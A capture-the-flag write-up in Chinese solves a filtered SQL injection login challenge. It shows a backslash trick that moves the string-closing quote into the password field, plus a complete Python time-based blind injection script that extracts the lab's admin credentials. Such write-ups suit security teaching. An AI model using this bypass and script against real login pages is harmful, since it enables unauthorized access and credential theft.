# Liki-Jail

## 题目简述

登录接口把用户名和密码直接拼入 SQL 查询，但用正则过滤了引号、空格、`union`、`and`、`mid` 等常见注入字符。可以利用反斜杠转义用户名后的引号，让密码字段中的开头引号转而闭合前面的字符串，再用注释和时间盲注恢复管理员凭据。

## 解题过程

后端查询形如：

```sql
SELECT * FROM `u5ers`
WHERE `usern@me`='$username' AND `p@ssword`='$password'
```

过滤规则为：

```text
/=|"|'|union|and|&|\||;| |-|mid/i
```

令用户名以反斜杠结尾，例如 `admin\`。反斜杠会转义紧随其后的用户名闭合引号，下一枚真正生效的引号就变成密码值前的引号。密码内容再以 `#` 注释掉查询末尾，于是可把条件注入到密码字段：

```sql
SELECT * FROM `u5ers`
WHERE `usern@me`='admin\' AND `p@ssword`='/**/OR/**/IF(...,0,SLEEP(2))#'
```

使用 `/**/` 代替空格，逐字符比较目标值。以下脚本直接枚举 ASCII；当条件为假时执行 `SLEEP(2)`，第一个触发延迟的阈值就是当前字符：

```python
import requests

url = "http://127.0.0.1:10031/login.php"
result = ""

for position in range(1, 100):
    found = False
    for codepoint in range(31, 128):
        query = (
            "SELECT/**/GROUP_CONCAT(`usern@me`,0x2c,`p@ssword`)"
            "/**/FROM/**/u5ers"
        )
        payload = (
            "/**/OR/**/IF(ASCII(SUBSTR(({}),{},1))>{},0,SLEEP(2))#"
        ).format(query, position, codepoint)

        response = requests.post(
            url,
            data={"username": "admin\\", "password": payload},
            timeout=5,
        )
        if response.elapsed.total_seconds() > 2:
            result += chr(codepoint)
            print(result)
            found = True
            break

    if not found:
        break
```

按同样方法先确认数据库名、表名和列名，官方解题记录依次得到：

```text
数据库：week3sqli
数据表：u5ers
字段：usern@me, p@ssword
记录：admin, sOme7hiNgseCretw4sHidd3n
```

使用恢复出的管理员凭据登录即可取得题目页面中的 flag。官方 PDF 没有保留该在线实例返回的具体 flag，因此这里不补造字符串。

## 方法总结

过滤引号并不等于消除了字符串上下文注入；反斜杠可以改变后续引号的语义，使另一个参数承担闭合字符串的作用。构造时间盲注时还要准确对应 `IF` 的真假分支，否则延迟代表的是“大于”还是“不大于”会被读反。最终应分阶段枚举库、表、列和值，避免把猜测写成结论。
